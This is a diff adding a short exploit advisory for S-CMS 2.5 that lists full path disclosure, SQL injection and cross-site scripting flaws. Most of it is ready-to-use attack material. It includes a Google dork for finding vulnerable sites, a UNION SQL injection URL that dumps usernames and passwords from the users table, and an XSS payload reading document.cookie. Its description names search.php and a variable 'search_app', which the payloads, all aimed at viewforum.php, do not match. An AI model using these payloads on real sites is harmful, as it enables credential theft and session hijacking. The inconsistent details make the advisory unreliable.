@@ -1,0 +1,16 @@
+# ============================================================
+# Exploit Title: S-CMS Multiple Vuln
+# Date: 14/11/2010
+# Author: LordTittiS
+# Greetings To: God_Of_Pain, System_Overide
+# Software Link: http://www.matteoiammarrone.com
+# http://www.matteoiammarrone.com/public/s-cms/
+# Vulnerability Type: Full Path Disclosure / SQL Injection / Cross Site Scripting
+# Version: 2.5
+# =========================================================== 
+-Vulnerability Details:The vulnerability is in the file search.php, the variable search_app is vulnerable.An attacker can exploit this to find out the rootpath of website or for SQLi attack. -Google Dork: inurl:viewforum.php?id= S-Cms
+-Exploit: 
+http://server/s-cms/viewforum.php?id='1 (FPD)
+
+http://server/s-cms/viewforum.php?id=1+union+select+1,2,group_concat(username,0x3a,password),4,5,6,7+from+cms_users-- (SQLi)
+http://server/s-cms/viewforum.php?id='1%3E%22%3Cscript%3Ealert(document.cookie)%3C/script%3E (XSS) 		 	   		  
